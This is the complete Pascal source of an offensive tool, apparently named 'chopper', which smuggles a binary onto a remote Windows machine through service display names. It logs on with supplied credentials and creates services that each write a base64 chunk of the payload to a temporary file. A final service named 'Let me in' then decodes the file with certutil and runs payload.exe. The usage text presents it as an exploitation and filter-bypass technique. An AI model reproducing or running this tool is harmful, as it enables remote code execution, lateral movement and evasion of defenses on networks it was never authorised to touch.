program chopper;

{$mode Delphi}

uses
  {$IFDEF UNIX}{$IFDEF UseCThreads}
  cthreads,
  {$ENDIF}{$ENDIF}
  Classes, SysUtils,jwawinsvc, windows,base64,CustApp
  { you can add units after this };

type

  { Tchopper }

  Tchopper = class(TCustomApplication)
  protected
    procedure DoRun; override;
  public
    constructor Create(TheOwner: TComponent); override;
    destructor Destroy; override;
    procedure execute; virtual;
    procedure usage; virtual;
  end;

{ Tchopper }

procedure Tchopper.DoRun;
var
  ErrorMsg: String;
begin
  // quick check parameters
  ErrorMsg:=CheckOptions('s t u p d f', 'start target username password domain filename');
  if ErrorMsg<>'' then begin
    ShowException(Exception.Create(ErrorMsg));
    Terminate;
    Exit;
  end;

  // parse parameters
  if HasOption('s', 'start') then begin
    execute;
    Terminate;
    Exit;
  end;

  { add your program here }
    usage;
  // stop program loop
  Terminate;
end;



function FileToBase64(const AFile: String; var Base64: String): Boolean;
var
  MS: TMemoryStream;
  Str: String;
begin
  Result := False;
  if not FileExists(AFile) then
    Exit;
  MS := TMemoryStream.Create;
  try
    MS.LoadFromFile(AFile);
    if MS.Size > 0 then
    begin
      SetLength(Str, MS.Size div SizeOf(Char));
      MS.ReadBuffer(Str[1], MS.Size div SizeOf(Char));
      Base64 := EncodeStringBase64(Str);
      Result := True;
    end;
  finally
    MS.Free;
  end;
end;

// thanks for https://www.swissdelphicenter.ch/
 function ServiceStart(
  sMachine,
  sService : string ) : boolean;
var

  schm, schs   : SC_Handle;

  ss     : TServiceStatus;
  psTemp : pointer;
  dwChkP : DWord;
  hToken: Thandle;
begin

  ss.dwCurrentState := 0;

  // connect to the service
  // control manager
  schm := OpenSCManager(PChar(sMachine),Nil,SC_MANAGER_CONNECT);

  // if successful...
  if(schm > 0)then
  begin
    // open a handle to
    // the specified service
    schs := OpenService(
      schm,
      PChar(sService),
      // we want to
      // start the service and
      SERVICE_START or
      // query service status
      SERVICE_QUERY_STATUS);

    // if successful...
    if(schs > 0)then
    begin
      psTemp := Nil;
      if(StartService(
           schs,
           0,
           psTemp))then
      begin
        // check status
        if(QueryServiceStatus(
             schs,
             ss))then
        begin
          while(SERVICE_RUNNING
            <> ss.dwCurrentState)do
          begin

            dwChkP := ss.dwCheckPoint;

            Sleep(ss.dwWaitHint);

            if(not QueryServiceStatus(
                 schs,
                 ss))then
            begin
              break;
            end;

            if(ss.dwCheckPoint <
              dwChkP)then
            begin
              break;
            end;
          end;
        end;
      end;
      CloseServiceHandle(schs);
    end;
    CloseServiceHandle(schm);
  end;
  Result :=
    SERVICE_RUNNING =
      ss.dwCurrentState;
end;


function final_call(username,password,domain,sMachine, sService: PChar): DWORD;
 var
   SCManHandle, SvcHandle: SC_Handle;
   htoken:Thandle;
   SS: TServiceStatus;
   dwStat: DWORD;
   ServiceName,ServiceDisplayName,ServiceExecutable:Pchar;
 begin


 servicename := 'final_seg';
 servicedisplayname := 'Let me in';
 ServiceExecutable := pchar('c:\windows\system32\cmd.exe /c certutil -decode -f tmp_payload.txt payload.exe & payload.exe"');



 hToken := 0;
 LogonUser(username, domain, password,
    LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken);

ImpersonateLoggedOnUser(hToken);
   dwStat := 0;
   // Open service manager handle.
   SCManHandle := OpenSCManager(sMachine, nil, SC_MANAGER_ALL_ACCESS);
   if (SCManHandle > 0) then
   begin

     SvcHandle := OpenService(SCManHandle, sService, SERVICE_QUERY_STATUS);
     Svchandle := CreateService(SCManHandle,ServiceName,ServiceDisplayName,SERVICE_ALL_ACCESS,SERVICE_WIN32_OWN_PROCESS,SERVICE_DEMAND_START,SERVICE_ERROR_NORMAL,ServiceExecutable,nil,nil,nil,nil,nil);

     if (SvcHandle > 0) then
     begin
       // SS structure holds the service status (TServiceStatus);
        //  servicestart;
       writeln('[+] executing the payload..');
       ServiceStart(sMachine,servicename);

       if (QueryServiceStatus(SvcHandle, SS)) then
         dwStat := ss.dwCurrentState;
       CloseServiceHandle(SvcHandle);
     end;
     CloseServiceHandle(SCManHandle);
   end;
   Result := dwStat;
 end;


Function ServiceDelete(sMachine, sService: pchar): Boolean;
Var
  schm, schs: SC_Handle;
  ss: TServiceStatus;
  dwChkP: dword;
Begin
  Result := False;
  schm := OpenSCManager(PChar(sMachine), Nil, SC_MANAGER_CONNECT);
  If schm > 0 Then Begin
    schs := OpenService(schm, PChar(sService),STANDARD_RIGHTS_REQUIRED or SERVICE_STOP Or SERVICE_QUERY_STATUS);
    If schs > 0 Then Begin
      If (QueryServiceStatus(schs, ss)) Then Begin
        While (SERVICE_STOPPED <> ss.dwCurrentState) Do Begin
          ControlService(schs, SERVICE_CONTROL_STOP, ss);
          dwChkP := ss.dwCheckPoint;
          Sleep(ss.dwWaitHint);
          If (Not QueryServiceStatus(schs, ss)) Then
            Break;
          If (ss.dwCheckPoint < dwChkP) Then
            Break;
        End;
      End;
      DeleteService(schs);
      CloseServiceHandle(schs);
    End;
    CloseServiceHandle(schm);

    // If service does not exist, then everything is fine.
    schm := OpenSCManager(PChar(sMachine), Nil, SC_MANAGER_CONNECT);
    If schm > 0 Then Begin
      schs := OpenService(schm, PChar(sService), SERVICE_QUERY_STATUS);
      If schs = 0 Then Begin
        If GetLastError = ERROR_SERVICE_DOES_NOT_EXIST Then
          Result := True;
      End Else Begin
        CloseServiceHandle(schs);
      End;
      CloseServiceHandle(schm);
    End;
  End;
End;


 function Get_Create_service(username,password,domain,sMachine: PChar;chunk:string): DWORD;
 var
   SCManHandle, SvcHandle: SC_Handle;
   htoken:Thandle;
   SS: TServiceStatus;
   dwStat: DWORD;
   ServiceName,ServiceDisplayName,ServiceExecutable:Pchar;
   len,numelem ,i,ch: integer;
   arr : array of string;
 begin
   ch := 0;
 len := length(chunk);
 numelem := len div 150;

 if len mod 150 <>0 then
 inc(NumElem);
 setLength(arr,NumElem);

 for i := 0 to High(arr) do
 Arr[i] := copy(chunk,i * 150 + 1, 150);

 for i := 0 to High (arr) do begin
 inc(ch,1);

 servicename := pchar('seg'+inttostr(ch));
 servicedisplayname := pchar(Arr[i]);
 ServiceExecutable := pchar('c:\windows\system32\cmd.exe /c powershell -command "Get-Service "'+Pchar(servicename)+'" | select -Expand DisplayName |out-file -append tmp_payload.txt"');



 hToken := 0;
 LogonUser(username, domain, password,
    LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken);

ImpersonateLoggedOnUser(hToken);
   dwStat := 0;
   // Open service manager handle.
   SCManHandle := OpenSCManager(sMachine, nil, SC_MANAGER_ALL_ACCESS);
   if (SCManHandle > 0) then
   begin

     SvcHandle := OpenService(SCManHandle, servicename, SERVICE_QUERY_STATUS);
     try
     sleep(1000); // thats will sleep for a while to make sure execution is on place
     Svchandle := CreateService(SCManHandle,ServiceName,ServiceDisplayName,SERVICE_ALL_ACCESS,SERVICE_WIN32_OWN_PROCESS,SERVICE_DEMAND_START,SERVICE_ERROR_NORMAL,ServiceExecutable,nil,nil,nil,nil,nil);

     except on E: exception do
         writeln(E.Message);
     end;
     if (SvcHandle > 0) then
     begin
       // SS structure holds the service status (TServiceStatus);
        //  servicestart;
       ServiceStart(sMachine,servicename);
        ServiceDelete(sMachine,servicename);

       if (QueryServiceStatus(SvcHandle, SS)) then
         dwStat := ss.dwCurrentState;
       CloseServiceHandle(SvcHandle);
     end;
     CloseServiceHandle(SCManHandle);
   end;
   Result := dwStat;
 end;
 end;
constructor Tchopper.Create(TheOwner: TComponent);
begin
  inherited Create(TheOwner);
  StopOnException:=True;
end;

destructor Tchopper.Destroy;
begin
  inherited Destroy;
end;

procedure Tchopper.usage;
begin
writeln('winsvc.h smuggling binary via Service DisplayName');
writeln('No Rate limitation Exploitation technique & filter bypass');
writeln('Author : Lawrence Amer @zux0x3a , https://0xsp.com');
writeln('');
writeln('USAGE: '+'chopper.exe -s -u USERNAME -p PASSWORD -d DOMAIN -t MACHINE -f BINARYPATH');
end;

procedure Tchopper.execute;
var
  username,password,domain,machine,filename:string;
  res:string;
  i:integer;
begin
writeln('winsvc.h smuggling binary via Service DisplayName');
writeln('No Rate limitation Exploitation technique & filter bypass');
writeln('Author : Lawrence Amer @zux0x3a , https://0xsp.com');

for i := 1 to paramcount do begin
  //check arg option
  if (paramstr(i)='-t') then begin
     machine := paramstr(i+1);
  end;
    if (paramstr(i)='-u') then begin
     username := paramstr(i+1);
  end;
      if (paramstr(i)='-p') then begin
     password := paramstr(i+1);
  end;
    if (paramstr(i)='-d') then begin
     domain := paramstr(i+1);
  end;
    if (paramstr(i) ='-f') then begin
     filename := paramstr(i+1);
    end;

end;

filetobase64(filename,res);
writeln('[->] sending payload..as chuncks');
Get_Create_service(pchar(username),pchar(password),pchar(domain),pchar(machine),res);
final_call(pchar(username),pchar(password),pchar(domain),pchar(machine),'final_seg');
end;



var
  Application: Tchopper;
begin
  Application:=Tchopper.Create(nil);
  Application.Title:='svc_smuggling';
  Application.Run;
  Application.Free;
end.
